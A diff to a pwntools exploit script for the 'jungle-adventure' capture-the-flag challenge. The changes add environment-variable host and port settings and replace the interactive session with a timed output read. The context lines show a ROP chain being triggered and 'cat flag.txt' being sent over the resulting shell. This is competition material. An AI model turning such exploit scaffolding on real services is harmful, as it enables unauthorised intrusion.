@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 from pwn import *
+import os
 
-binary = args.BIN or '../../publish/Pwn/jungle-adventure/jungle.bin'
+binary = args.BIN or 'attachments/jungle.bin'
 
 context.terminal = ["tmux", "splitw", "-h"]
 e = context.binary = ELF(binary)
 
-if args.REMOTE:
-   libc = ELF('../../publish/Pwn/jungle-adventure/libc.so.6', checksec=False)
+ENV_HOST = os.environ.get("HOST")
+ENV_PORT = os.environ.get("PORT")
+if args.REMOTE or ENV_HOST:
+   libc = ELF('publish/libc.so.6', checksec=False)
 else:
    libc = e.libc
 
@@ -17,7 +20,7 @@ continue
 '''
 
 
-if args.REMOTE:
+if args.REMOTE or ENV_HOST:
     TIMEOUT = 0.5
 else:
     TIMEOUT = 0.1
@@ -26,9 +29,9 @@ def get_remote():
     if args.GDB:
         # return gdb.debug(e.path, gdbscript=gs)
         return e.debug(gdbscript=gs)
-    elif args.REMOTE:
-        HOST = args.HOST or "2024.sunshinectf.games"
-        PORT = int(args.PORT or 24005)
+    elif args.REMOTE or ENV_HOST:
+        HOST = ENV_HOST or args.HOST or "2024.sunshinectf.games"
+        PORT = int(ENV_PORT or args.PORT or 24005)
         return remote(HOST, PORT)
     else:
         return process(e.path)
@@ -147,5 +150,5 @@ trigger_ROP_with_gameover()
 
 pause(1)
 p.sendline(b'cat flag.txt')
-
-p.interactive()
+sleep(0.5)
+print(p.recvrepeat(2).decode(errors='replace'))
